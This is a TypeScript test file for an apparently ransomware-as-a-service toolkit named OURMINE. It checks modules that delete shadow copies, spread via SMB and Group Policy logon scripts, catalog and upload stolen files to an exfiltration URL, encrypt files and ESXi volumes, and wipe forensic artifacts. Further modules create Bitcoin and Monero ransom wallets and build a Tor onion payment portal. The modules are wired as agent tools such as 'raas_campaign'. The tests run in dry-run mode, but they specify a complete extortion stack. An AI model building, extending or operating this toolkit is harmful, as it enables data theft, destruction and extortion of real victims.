import test from "node:test"
import assert from "node:assert"
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as os from "node:os"
import * as path from "node:path"

test("raas_engine destructive ops require live+forceLive", async () => {
  const { deleteVolumeShadowCopies, spreadViaSmb, spreadViaGpo } = await import("../src/raas_engine.ts")
  const vss = deleteVolumeShadowCopies({ live: false })
  assert.strictEqual(vss.dryRun, true)
  assert.strictEqual(vss.executed, false)
  const smb = spreadViaSmb(["10.0.0.1"], "echo test", { live: false })
  assert.strictEqual(smb.dryRun, true)
  const gpo = spreadViaGpo("corp.local", "Write-Host test", { live: false })
  assert.strictEqual(gpo.dryRun, true)
})

test("buildLeakCatalog produces real SHA-256 manifest", async () => {
  const { buildLeakCatalog } = await import("../src/raas_engine.ts")
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ourmine-raas-"))
  const sample = path.join(tmp, "secret_payroll.xlsx")
  fs.writeFileSync(sample, "payroll-data-lab")
  const r = buildLeakCatalog(tmp, { maxFiles: 10 })
  assert.ok(r.entries.length >= 1)
  assert.ok(r.manifestPath.endsWith(".json"))
  assert.ok(fs.existsSync(r.manifestPath))
  const entry = r.entries.find((e) => e.path === sample)
  assert.ok(entry?.sha256.length === 64)
  assert.ok(entry.tags.includes("financial"))
})

test("generateBtcWallet produces valid bc1 address and WIF", async () => {
  const { generateBtcWallet } = await import("../src/raas_wallet.ts")
  const w = generateBtcWallet()
  assert.ok(w.address.startsWith("bc1"))
  assert.ok(w.wif.length >= 50)
})

test("createWalletPair ephemeral stores in memory not disk", async () => {
  const { createWalletPair, listWallets, wipeAllWallets } = await import("../src/raas_wallet.ts")
  const pair = createWalletPair({ ephemeral: true })
  assert.strictEqual(pair.btc.ephemeral, true)
  assert.ok(pair.btc.wif)
  const listed = listWallets({})
  assert.ok(listed.some((w) => w.id === pair.btc.id))
  wipeAllWallets({ live: true, forceLive: true })
})

test("walletTerminalSummary redacts secrets", async () => {
  const { createWalletPair, walletTerminalSummary } = await import("../src/raas_wallet.ts")
  createWalletPair({ ephemeral: true })
  const s = walletTerminalSummary({ ephemeral: true })
  assert.ok(!s.includes("wif"))
  assert.ok(s.includes("OURMINE Wallet Vault"))
})

test("bridged wallet tools dispatch", async () => {
  const { executeAgentTool } = await import("../src/agent_tools.ts")
  const { ToolBroker } = await import("../src/tool_broker.ts")
  const { AttackSurfaceGraph } = await import("../src/attack_surface.ts")
  const graph = new AttackSurfaceGraph("wallet.local")
  const ctx = { target: "wallet.local", graph, broker: new ToolBroker(), live: false }
  for (const t of ["raas_wallet_create", "raas_wallet_list", "raas_wallet_balance", "raas_wallet_wipe", "raas_wallet_install_deps"]) {
    const r = await executeAgentTool(ctx, t, { wallet_id: "wal_test_btc" })
    assert.ok(!r.error?.includes("unknown tool"), `${t}: ${r.error}`)
  }
})

test("generateXmrWallet returns unavailable not fake address when CLI missing", async () => {
  const { generateXmrWallet, checkWalletToolchain } = await import("../src/raas_wallet.ts")
  const tc = checkWalletToolchain()
  const r = generateXmrWallet({ ephemeral: true })
  if (!tc.xmr.moneroWalletCli) {
    assert.strictEqual(r.source, "unavailable")
    assert.strictEqual(r.address, "")
    assert.ok(r.error?.includes("monero-wallet-cli"))
  } else {
    assert.strictEqual(r.source, "monero-cli")
    assert.ok(XMR_ADDR_RE.test(r.address))
  }
})

const XMR_ADDR_RE = /^[48][0-9A-B][1-9A-HJ-NP-Za-km-z]{93}$/

test("getWalletBalance live BTC uses blockstream when no local node", async () => {
  const { createWalletPair, getWalletBalance } = await import("../src/raas_wallet.ts")
  const pair = createWalletPair({ ephemeral: true })
  const r = await getWalletBalance(pair.btc.id, { live: true })
  assert.strictEqual(r.dryRun, false)
  assert.ok(["bitcoin-cli", "electrum", "blockstream", "unavailable"].includes(r.source))
})

test("checkWalletToolchain reports wallet deps", async () => {
  const { checkWalletToolchain } = await import("../src/raas_wallet.ts")
  const tc = checkWalletToolchain()
  assert.strictEqual(tc.btc.native, true)
  assert.strictEqual(typeof tc.xmr.moneroWalletCli, "boolean")
})

test("ensureWalletToolchain dry-run returns apt commands not executed", async () => {
  const { ensureWalletToolchain } = await import("../src/raas_wallet.ts")
  const r = ensureWalletToolchain({ live: false })
  assert.strictEqual(r.dryRun, true)
  if (r.skipped.length) assert.ok(r.commands[0]?.includes("apt"))
})

test("bridged wallet install deps dispatch", async () => {
  const { executeAgentTool } = await import("../src/agent_tools.ts")
  const { ToolBroker } = await import("../src/tool_broker.ts")
  const { AttackSurfaceGraph } = await import("../src/attack_surface.ts")
  const graph = new AttackSurfaceGraph("wallet.local")
  const ctx = { target: "wallet.local", graph, broker: new ToolBroker(), live: false }
  const r = await executeAgentTool(ctx, "raas_wallet_install_deps", {})
  assert.ok(!r.error?.includes("unknown tool"))
})

test("generatePaymentBundle writes portal descriptor with tor v3 onion", async () => {
  const { generatePaymentBundle } = await import("../src/raas_engine.ts")
  const r = generatePaymentBundle({ live: false })
  assert.ok(r.keyId.length > 8)
  assert.ok(r.torPaymentId.endsWith(".onion"))
  assert.ok(r.bitcoinAddress.startsWith("bc1"))
  assert.ok(r.walletIds?.btc)
  if (r.walletIds?.xmr) {
    const { loadWallet } = await import("../src/raas_wallet.ts")
    const xmr = loadWallet(r.walletIds.xmr)
    if (xmr?.source === "monero-cli") assert.ok(xmr.address.length > 90)
  }
  assert.ok(fs.existsSync(r.portalDescriptorPath))
  assert.strictEqual(r.aesKeyHex, "")
  if (r.torPortal) {
    assert.ok(r.torPortal.onionAddress.endsWith(".onion"))
    assert.ok(fs.existsSync(r.torPortal.portalHtmlPath))
  }
})

test("onionV3FromPublicKey derives valid onion address", async () => {
  const { onionV3FromPublicKey } = await import("../src/raas_advanced.ts")
  const { publicKey } = crypto.generateKeyPairSync("ed25519")
  const pubRaw = publicKey.export({ type: "spki", format: "der" }).subarray(-32)
  const onion = onionV3FromPublicKey(pubRaw)
  assert.ok(onion.endsWith(".onion"))
  assert.ok(onion.length >= 56)
})

test("buildEsxiEncryptorStub includes keyId", async () => {
  const { buildEsxiEncryptorStub } = await import("../src/raas_advanced.ts")
  const stub = buildEsxiEncryptorStub("test_key_123")
  assert.ok(stub.includes("test_key_123"))
  assert.ok(stub.includes("vmfs/volumes"))
})

test("modifyGpoLogonScript dry-run returns sysvol path template", async () => {
  const { modifyGpoLogonScript } = await import("../src/raas_advanced.ts")
  const r = modifyGpoLogonScript("corp.local", "echo test", { live: false, gpoGuid: "ABCDEF12-3456-7890-ABCD-EF1234567890" })
  assert.strictEqual(r.dryRun, true)
  assert.ok(r.sysvolPath.includes("SYSVOL"))
})

test("anti_forensics dry-run returns empty not simulated", async () => {
  const { AntiForensicsEngine } = await import("../src/anti_forensics.ts")
  const engine = new AntiForensicsEngine()
  const r = await engine.reviewAntiForensics({ dryRun: true })
  assert.strictEqual(r.simulated, false)
  assert.strictEqual(r.clearedArtifacts.length, 0)
})

test("insider detectVolumeAnomalies dry-run no synthetic injection", async () => {
  const { detectVolumeAnomalies } = await import("../src/insider.ts")
  const events = [{ userId: "u1", action: "read", timestamp: new Date().toISOString(), volumeBytes: 1000 }]
  const r = detectVolumeAnomalies(events, { dryRun: true, volumeThresholdBytes: 999999 })
  assert.strictEqual(r.length, 0)
})

test("assessRaasReadiness returns stack checklist", async () => {
  const { assessRaasReadiness } = await import("../src/raas_engine.ts")
  const r = assessRaasReadiness("/tmp")
  assert.ok(Array.isArray(r.stack))
  assert.ok(r.stack.includes("vss_wipe"))
  assert.ok(r.stack.includes("leak_catalog"))
})

test("ransomware encryptFile dry-run returns empty iv/tag", async () => {
  const { encryptFile, generateKey } = await import("../src/ransomware.ts")
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ourmine-enc-"))
  const f = path.join(tmp, "sample.txt")
  fs.writeFileSync(f, "lab")
  const key = generateKey()
  const r = encryptFile(f, Buffer.from(key.key, "hex"), key.id, { live: false })
  assert.strictEqual(r.iv, "")
  assert.strictEqual(r.tag, "")
  assert.ok(fs.readFileSync(f, "utf8") === "lab")
})

test("runRaasCampaign assessment mode does not encrypt", async () => {
  const { runRaasCampaign } = await import("../src/raas_engine.ts")
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ourmine-camp-"))
  fs.writeFileSync(path.join(tmp, "data.bak"), "backup")
  const r = await runRaasCampaign({ targetDir: tmp, live: false })
  assert.strictEqual(r.dryRun, true)
  assert.strictEqual(r.phase, "assessment")
  assert.strictEqual(r.encryption.filesAffected, 0)
  assert.ok(r.leakCatalog.count >= 1)
})

test("uploadLeakManifest requires live+forceLive", async () => {
  const { buildLeakCatalog, uploadLeakManifest } = await import("../src/raas_engine.ts")
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "ourmine-exfil-"))
  fs.writeFileSync(path.join(tmp, "data.bak"), "x")
  const cat = buildLeakCatalog(tmp, { maxFiles: 5 })
  process.env.OURMINE_LEAK_UPLOAD_URL = "http://127.0.0.1:19999/upload"
  const r = await uploadLeakManifest(cat.manifestPath, { live: false })
  assert.strictEqual(r.uploaded, false)
  assert.strictEqual(r.dryRun, true)
  delete process.env.OURMINE_LEAK_UPLOAD_URL
})

test("bridged raas exfil and gpo deploy dispatch", async () => {
  const { executeAgentTool } = await import("../src/agent_tools.ts")
  const { ToolBroker } = await import("../src/tool_broker.ts")
  const { AttackSurfaceGraph } = await import("../src/attack_surface.ts")
  const graph = new AttackSurfaceGraph("raas.local")
  const ctx = { target: "raas.local", graph, broker: new ToolBroker(), live: false }
  for (const t of ["raas_exfil_upload", "raas_gpo_deploy"]) {
    const r = await executeAgentTool(ctx, t, {})
    assert.ok(!r.error?.includes("unknown tool"), `${t}: ${r.error}`)
  }
})

test("bridged raas tools dispatch", async () => {
  const { executeAgentTool } = await import("../src/agent_tools.ts")
  const { ToolBroker } = await import("../src/tool_broker.ts")
  const { AttackSurfaceGraph } = await import("../src/attack_surface.ts")
  const graph = new AttackSurfaceGraph("raas.local")
  const ctx = { target: "raas.local", graph, broker: new ToolBroker(), live: false }
  for (const t of [
    "raas_campaign",
    "raas_vss_wipe",
    "raas_leak_catalog",
    "raas_esxi_encrypt",
    "raas_smb_spread",
    "raas_gpo_spread",
    "raas_payment",
    "ransomware_assess",
  ]) {
    const r = await executeAgentTool(ctx, t, {})
    assert.ok(!r.error?.includes("unknown tool"), `${t}: ${r.error}`)
    assert.ok(r.success, `${t} failed: ${r.error}`)
  }
})
